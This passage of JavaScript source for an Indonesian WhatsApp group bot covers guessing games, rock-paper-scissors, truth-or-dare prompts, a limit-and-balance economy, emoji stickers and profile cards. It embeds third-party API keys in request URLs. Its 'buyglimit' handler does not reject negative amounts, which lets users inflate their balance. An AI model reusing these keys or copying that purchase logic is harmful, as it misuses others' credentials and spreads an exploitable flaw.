                     let anau = randKey.data.jawaban.toLowerCase()
                     game.addsyiko(from, anau, gamewaktu, siapaaku)
                     gameAdd(sender, glimit)
                      }
                     break
          case 'suit':
           if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
           var syahirp = randomNomor(100)
           addBalance(sender, syahirp, balance)
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang! \nDan Mendapatkan Balance Sebanyak $${syahirp}`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang! \nDan Mendapatkan Balance Sebanyak $${syahirp}`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang! \nDan Mendapatkan Balance Sebanyak $${syahirp}`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              gameAdd(sender, glimit)
              break        
case 'aduayam':
           if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
           var syahirw = randomNomor(100)
           addBalance(sender, syahirw, balance)
              if (!q) return reply(`Kirim perintah ${prefix}aduayam 🐓 / 🦃 / 🐥`)
              const userspilis = q
              if (!userspilis.match(/🦃|🐥|🐓/)) return reply(`Pilih 🦃, 🐓, 🐥`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = '🐥'; 
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = '🦃'; 
              } else {
              computer = '🐓'; 
}
              if ( userspilis == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilis == '🦃' ) {
              if( computer == '🐥' ) {
              reply(`👤 Kamu memilih Ayam 🦃\n🖥 ️Dan Bot Menggunakan Ayam 🐥\n\n➣ HASIL = Kamu menang! \n\nDan Memenangkan Hadiah Sebanyak $${syahirw}`)
              } else {
              reply(`👤 ️Kamu Memilih Ayam 🦃\n🖥 ️Dan bot Menggunakan Ayam 🐓\n\n➣ HASIL = Kamu kalah! \n\nCepat Latih Ayam Mu Sekarang`)
}
              } else if ( userspilis == '🐓' ) {
              if( computer == '🦃' ) {
              reply(`👤 Kamu memilih ayam 🐓\n🖥 ️Dan bot Menggunakan Ayam 🦃\n\n➣ HASIL = Kamu kalah! \n\nTerus Melatih Ayam mu`)
              } else {
              reply(`👤 Kamu memilih 🐓\n🖥 ️Dan bot Menggunakan Ayam 🦃\n\n➣ HASIL= Kamu menang! \n\nDan Mendapatkan Imbalan Sebanyak $${syahirw}`)
}
              } else if ( userspilis == '🐥' ) {
              if( computer == '🐓' ) {
              reply(`👤 Kamu memilih ayam 🐥\n🖥 ️Dan bot Menggunakan Ayam 🐓\n\n➣ HASIL = Kamu menang! \n\nDan Mendapatkan Imbalan Sebanyak $${syahirw}`)
              } else {
              reply(`👤 Kamu memilih ayam 🐥\n🖥 ️Dan bot Menggunakan Ayam 🦃\n\n➣ HASIL = Kamu kalah :( \n\nTetap Semangat Dan Latih Ayam Mu terus`)
}
}
              gameAdd(sender, glimit)
              break        
           
           case 'tebakanime': case 'ta':{
                    if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                    if (!isGroup) return setReply("Hanya bisa di group")
                    setReply(mess.wait)
                    if (game.isTebakAnime(from, tebakanime)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/tebakanime.js');
				    jsonData = JSON.parse(data);
			        randIndex = Math.floor(Math.random() * jsonData.length);
			        randKey = jsonData[randIndex];                                        
                    const petunjuk = randKey.result.name.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                    //sendMediaURL(from, randKey.result.image, monospace(`Silahkan tebak karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu}s`), iky)
                    setReply(randKey.result.image)
                    reply(`Waktu Yang di Berikan Hanya 60s`)
                    let nurulsayank = randKey.result.name.toLowerCase()
                    game.addanime(from, nurulsayank, gamewaktu, tebakanime)
                    gameAdd(sender, glimit)
                    }
                    break
           
           
           
           
           
           
          
           
           case 'math':{
                       if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                       if (!isGroup) return setReply(mess.only.group)
                       if (game.isMtk(from, mtk)) return setReply(`Masih ada soal yang belum di selesaikan`)
                       if (!q) return setReply(`*Mode tersedia :*\n1. very_easy\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n\n_Example : ${prefix + command} hard_`)
                       let anu = await axios.get(`https://api.zekais.com/math?mode=${q}&apikey=OIFQ2Pad`)
                       setReply(`*Soal :*\n_${anu.data.nilai_1} ${anu.data.tanda} ${anu.data.nilai_2} :_\nWaktu : ${gamewaktu}`)
                       let anih = anu.data.jawaban.toLowerCase()
                       game.addmtk(from, anih, gamewaktu, mtk)
                       gameAdd(sender, glimit)
                       }
                       break
           
           
           case 'tebakkata': case 'tk':{
                   if (!isGroup) return setReply(mess.only.group)
                   if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                   if (game.isTebakKata(from, tebakkata)) return setReply(`Masih ada soal yang belum di selesaikan`)          
                   data = fs.readFileSync('./lib/game/tebakkata.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];
                   
                   setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.acak}\n\nTipe: ${randKey.result.tipe}\n\nWaktu : ${gamewaktu} detik`)
                   let ahhh = randKey.result.jawaban.toLowerCase()
                   game.addkata(from, ahhh, gamewaktu, tebakkata)
                   gameAdd(sender, glimit)
                    }
                   break
 case 'asahotak':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/asahotak?apikey=himaru`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.pertanyaan
              ikyc.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :'+pertanyaan+'\n• *Kata Kunci* :'+kisi_kisi, text, { quoted: fhidetag}).then(() => {
              asahotak[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
})
              await sleep(30000)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete asahotak[sender.split('@')[0]]
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
}
              gameAdd(sender, glimit)
              break
case 'tebakjenaka':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/jenaka?apikey=himaru`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              ikyc.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :'+pertanyaan+'\n• *Kata Kunci* :'+kisi_kisi, text, { quoted: fhidetag}).then(() => {
              tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
})
              await sleep(30000)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakjenaka[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
}
              gameAdd(sender, glimit)
              break
       case 'kimiakuis':
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakimia.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=himaru`)
              get_result = get_result.result
              jawaban = get_result.lambang
              pertanyaan = get_result.nama
              ikyc.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: fhidetag}).then(() => {
              tebakimia[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
})
              await sleep(30000)
              if (tebakimia.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakimia[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
}
              gameAdd(sender, glimit)
              break                   
       case 'whatanime':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
                    let yoooo = await ikyc.downloadAndSaveMediaMessage(encmedia)
	                let bodyForm = new FormData();
        	        bodyForm.append('image', fs.createReadStream(yoooo)) 
                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
                    .then(async(res) =>{
                    if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
                    let teks = ''
                    if (res.result[0].similarity < 0.92) {
                        teks = '*Low similarity. 🤔*\n\n'
                    }
                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
                    sendFileFromUrl(res.result[0].video, video, {quoted: iky, caption: teks})
                    limitAdd(sender, limit)
                    })    
                 .catch((err) => {                   
                   setReply(mess.error.api)
                    })
                    } else if (isSticker || isQuotedSticker ) {
                    let encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    let yoooo = await ikyc.downloadAndSaveMediaMessage(encmedia)
                    let ran = getRandom('.png')
				  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
			        fs.unlinkSync(yoooo)
			    	if (err) return setReply('Gagal :V')   
	                let bodyForm = new FormData();
        	        bodyForm.append('image', fs.createReadStream(ran)) 
                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
                    .then(async(res) =>{
                    if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
                    let teks = ''
                    if (res.result[0].similarity < 0.92) {
                        teks = '*Low similarity. 🤔*\n\n'
                    }
                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
                    ikyc.sendFileFromUrl(from, res.result[0].video, teks, msg)
                    limitAdd(sender, limit)
                    fs.unlinkSync(ran)
                    })
                 .catch((err) => {       
                            setReply(mess.error.api)
                        })
               })
                 } else {
                   setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
                }
               }
               break
        
        
        
        case "tourl":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !iky.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : iky;
          owgi = await ikyc.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply("kirim/reply gambar/video");
        }
        break;
        
        
        
        
        case 'setbio':
        case 'setbiobot':
                                     {
									 if (!isOwner && !iky.key.fromMe) return setReply("Khusus Owner")
									if (args.length < 1) return setReply(`Kirim perintah ${command} nama\n\nContoh : ${command} Paijo`)
									autobio = false
									await ikyc.setStatus(q)
									.then((res) => setReply(`Berhasil mengganti status bio ke ${q}`))
									.catch((err) => setReply('waduh error'))
									}
									break
        
        
        
        
        
        
           
           case 'cekbapak': // By Ramlan ID
					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Iky ID']
					const cek = bapak[Math.floor(Math.random() * bapak.length)]
					ikyc.sendMessage(from, cek, text, { quoted: iky })
					break
					
					
					
					case 'truth':
					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					setReply(`${ttrth}`) 
					break
			case 'dare':
					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					setReply(`${der}`) 
					break
	     
//******************** 》Limit《 ********************\\
       case 'topbalance':
                      if(!isGroup)return setReply(mess.only.group)
                      ikyc.updatePresence(from, Presence.composing)
                      let txot = `*── 「 TOP BALANCE 」 ──*\n\n`
                      let mebn = [];
                      for (let i of balance){
                      mebn.push(i.id)
                      let bl = (i.balance)
                      txot += `*ID :* @${i.id.split("@")[0]}\n➸ Balance : ${bl}\n\n`
                      }
                      mentions(txot, mebn, true)
                      break
            case 'limit':
            case 'ceklimit': 
            case 'balance': 
            case 'glimit':
                      setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                      break
            case 'buylimit':{
                       if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
                       if (q.includes('-')) return setReply(`Jangan menggunakan -`)
                       if (isNaN(q)) return setReply(`Harus berupa angka`)
                       let ane = Number(math(q) * 100)
                       if (getBalance(sender, balance) < ane) return setReply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                       kurangBalance(sender, ane, balance)
                       giveLimit(sender, math(q), limit)
                       setReply(monospace(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
                       }
                       break
    
           
           
           
           case 'buyglimit':
                       {
                       if(!q)return setReply(`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`)
                       const koinPerlimit = 100
                       const total = koinPerlimit * q
                       if (getBalance(sender,balance) <= total) return setReply(`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
                       kurangBalance(sender, total, balance)
                       givegame(sender, q, glimit)
                       setReply(monospace(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
                       }
                       break 
          case 'giftlimit':
                       if(!isOwner)return
                       if (!q)return setReply(`Example : ${prefix + command} @tag 10`)
                       lim = q.split(" ")[1]
                       const tag1 = `${q.split(" ")[0].replace("@",'')}@s.whatsapp.net`
                       giveLimit(tag1, lim, limit)
                       setReply('Succes')
                       break           
           case 'giftglimit':
                       if(!isOwner)return
                       if (!q)return setReply(`Example : ${prefix + command} @tag 10`)
                       liu = q.split(" ")[1]
                       const tag3 = `${q.split(" ")[0].replace("@",'')}@s.whatsapp.net`
                       givegame(tag3, liu, glimit)
                       setReply('Succes')
                       break
           
           
          
                  
            




      
          
        case 'listprem':
        case 'listpremium':

                   let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
                   let men = [];
                   for (let i of premium){
                   men.push(i.id)
                   let cekvip = ms(i.expired - Date.now())
                   txt += `*ID :* ${i.id}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
                   }
                   setReply(txt, men, true)
                   break
                   
                   case 'emoji':
                      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                      if (args.length == 0) return setReply(`Example: ${prefix + command} wa 🗿

*LIST EMOJI*

code: ap
vendor: Apple
      
code: go
vendor: Google
      
code: sa
vendor: Samsung
      
code: ms
vendor: Microsoft
      
code: wa
vendor: WhatsApp
      
code: tw
vendor: Twitter
      
code: fb
vendor: Facebook
      
code: jp
vendor: JoyPixels
     
code: op
vendor: OpenMoji
      
code: od
vendor: emojidex
      
code: mes
vendor: Messenger
      
code: lg
vendor: logitech
    
code: htc
vendor: HTC
      
code: mo
vendor: Mozilla
      
code: sb
vendor: SoftBank
      
code: dm
vendor: Docomo
      
code: au
vendor: auKDDI

penggunaan : ${prefix + command } wa 🗿`)
                     emojis = args[0]
                     args.shift()
                     emoje = args.join(" ")
                     setReply(mess.wait)
                     limitAdd(sender, limit)
                     switch (emojis) {
               case 'ap':
               case 'apple':
			             emoji.get(`${emoje}`).then(emoji => {
				         teks = `${emoji.images[0].url}`
    	         		sendStickerFromUrl(from,`${teks}`)	
             			console.log(teks)
   	  	     		})
                        break
              case 'go':
              case 'google':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[1].url}`
    	   	  	sendStickerFromUrl(from,`${teks}`)	
    	   	  	console.log(teks)
   			  	})
                     break
              case 'sa':
            case 'samsung':
                    emoji.get(`${emoje}`).then(emoji => {
				    teks = `${emoji.images[2].url}`
       	 		sendStickerFromUrl(from,`${teks}`)	
        			console.log(teks)
   	 			})
                   break
            case 'ms':
            case 'microsoft':
                    emoji.get(`${emoje}`).then(emoji => {
				    teks = `${emoji.images[3].url}`
       	 		sendStickerFromUrl(from,`${teks}`)	
        			console.log(teks)
   	 			})
                   break
              case 'wa':
              case 'whatsapp':
                         emoji.get(`${emoje}`).then(emoji => {
				         teks = `${emoji.images[4].url}`
      	       		sendStickerFromUrl(from,`${teks}`)	
    		         	console.log(teks)
   		     	 	})
                         break
case "wallpaper": case 'loli': case 'outfit': case 'husbu': case 'cosplay': case 'wallml': case 'wallff':
        sendButMessage(from, `Random ${command} by iky`, `press the button below`, [
          {
            buttonId: `/pinterest ${command}`,
            buttonText: {
              displayText: `• Click`,
            },
            type: 1,
          },
        ]);
        break                         
               case 'tw':
                  emoji.get(`${emoje}`).then(emoji => {
				  teks = `${emoji.images[5].url}`
    	  		sendStickerFromUrl(from,`${teks}`)	
      			console.log(teks)
   				})
                  break
                  
              case 'fb':
              case 'facebook':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[6].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
               case 'jp':
              case 'joypixel':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[7].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
              case 'om':
              case 'openmoji':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[8].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
               case 'od':
              case 'emojidex':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[9].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
               case 'mes':
              case 'messenger':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[10].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
              case 'lg':
              case 'logitech':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[11].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
             case 'htc':
              
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[12].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
                        
                        
              
           case 'mo':
           case 'mozila':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[13].url}`
    			     sendStickerFromUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
             
             case 'sb':
           case 'softbank':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[14].url}`
    			     sendStickerFromUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
           case 'dm':
           case 'docomo':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[15].url}`
    			     sendStickerFromUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
          case 'au':
           case 'aukddi':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[16].url}`
    			     sendStickerFromUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break            
                   }
                   break
                   
                 


  case 'facebook':
  if(!q) return setReply("Masukan link facebook")
		Fb.getInfo(q).then((info) => console.log(JSON.stringify(info, null, 2)));
		break
                   
                   
                   
                   
           case 'claim':   
           case 'klaim':
              if (isClaimOn) return setReply(mess.claimOnAlready)
                    var htgm6 = randomNomor(1000)
                    var htgm7 = randomNomor(20)
                    addBalance(sender, htgm6, balance)
                    giveLimit(sender, htgm7, balance)
                    _claim.push(sender)
                    fs.writeFileSync('./database/claim.json', JSON.stringify(_claim))
                    await setReply(`*── 「 CLAIM  」 ──*

Selamat kamu mendapatkan *${htgm7}* Limit & *${htgm6}* balance
Dari claim harian`)
                    break              
        case 'cekprem': case 'cekpremium':
                   if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                   let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                   let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
                   try {
                   ppimg = await ikyc.getProfilePicture(`${sender.split('@')[0]}@c.us`)
                   } catch {
                   ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                   }
                   teks = `❒ *「 Premium User 」* ❒ 
  
 *Nama : ${pushname}*
 *Tag : @${sender.split("@")[0]}*
 *Expired : ${premiumnya}*`
                    its = await getBuffer (ppimg)
                    ikyc.sendMessage(from, its, image, {contextInfo: forward, caption: teks
                     })
                     break
                     
                     
           
           
           
           
case 'me': 
case 'profile':
case 'myprofile':
try {
ppimg = await ikyc.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
stst = await ikyc.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
const prmm =  isPremium ? `${cekprm.days} Hari ${cekprm.hours} Jam ${cekprm.minutes} Menit ${cekprm.seconds} Detik`:'Not Premium'
teks = `
╭─▸「 𝙋𝙧𝙤𝙛𝙞𝙡𝙚 𝙐𝙨𝙚𝙧 」
│✦ 𝙉𝘼𝙈𝙀 : ➫ ${pushname} 
│✦ 𝙏𝘼𝙂 : ➫ @${sender.split("@")[0]}
│✦ 𝙎𝙏𝘼𝙏𝙐𝙎 : ➫ ${isPremium ? 'Premium':'Free'}
│✦ 𝙎𝙏𝘼𝙏𝙐𝙎-𝘽𝙊𝙏 : ➫ ${isOwner ? 'Owner':'User'}
│✦ 𝙀𝙓𝙋𝙄𝙍𝙀𝘿 : ➫ ${prmm}
│✦ 𝙇𝙄𝙈𝙄𝙏 : ➫ ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}
│✦ 𝙇𝙄𝙈𝙄𝙏 𝙂𝘼𝙈𝙎 : ➫ ${cekGLimit(sender, gcount, glimit)}/${gcount}
│✦ 𝘽𝘼𝙇𝘼𝙉𝘾 𝙐𝙎𝙀𝙍 : ➫ ${getBalance(sender, balance)}
╰────────────[`
its = await getBuffer (ppimg)
ikyc.sendMessage(from, teks, text, { thumbnail: its, detecLinks: false, quoted: iky, contextInfo: { forward, externalAdReply:{title: `${pushname}`,body:`${stst}`,previewType:"PHOTO",thumbnail: its, sourceUrl:`https://wa.me/${senderNumber}`}}})
break 
           
case 'myinfo':
try {
ppimg = await ikyc.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
stst = await ikyc.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				uptime = process.uptime();
teks = `
 「 𝙋𝙧𝙤𝙛𝙞𝙡𝙚 𝙐𝙨𝙚𝙧 」

➢  𝙇𝙄𝘽𝘼𝙍𝙔 : 𝘽𝘼𝙄𝙇𝙀𝙔𝙎 ><
➢  𝙋𝙍𝙀𝙁𝙄𝙓 : ( 𝙈𝙐𝙇𝙏𝙄 𝙋𝙍𝙀𝙁𝙄𝙓 )
➢  𝙏𝘼𝙉𝙂𝙂𝘼𝙇 𝙎𝙀𝙍𝙑𝙀𝙍 : 25-07-2021
➢  𝙒𝘼𝙆𝙏𝙐 𝙎𝙀𝙍𝙑𝙀𝙍 : ${timeWib} 𝙒 𝙄 𝘽


➢  𝙎𝙏𝘼𝙏𝙐𝙎 : ${isPremium ? 'Premium':'Free'}
➢  𝙇𝙄𝙈𝙄𝙏 𝙃𝘼𝙍𝙄𝘼𝙉 : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}
➢  𝙇𝙄𝙈𝙄𝙏 𝙂𝘼𝙈𝙀 : ${cekGLimit(sender, gcount, glimit)}/${gcount}
➢  𝘽𝘼𝙇𝘼𝙉𝘾𝙀 : ${getBalance(sender, balance)}

